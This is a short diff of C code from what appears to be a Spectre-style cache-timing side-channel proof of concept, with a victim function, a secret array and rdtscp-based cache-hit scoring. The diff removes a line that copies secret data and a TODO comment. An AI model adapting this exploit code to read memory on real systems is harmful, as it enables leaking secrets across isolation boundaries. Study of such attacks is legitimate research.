@@ -43,7 +43,6 @@ uint8_t temp[50]; /* Used so compiler won’t optimize out victim_function() */
 void victim_function(volatile uint8_t* addressToWriteTo) {
   
     *addressToWriteTo = 'P';
-    temp[3] = secret[0] -4;
 
 }
 
@@ -100,7 +99,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
         time1 = __rdtscp(&junk); /* READ TIMER */
         junk = *addr; /* MEMORY ACCESS TO TIME */
         time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-        if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
+        if (time2 <= CACHE_HIT_THRESHOLD ) {
             results[mix_i]++; /* cache hit - add +1 to score for this value */
 
         }
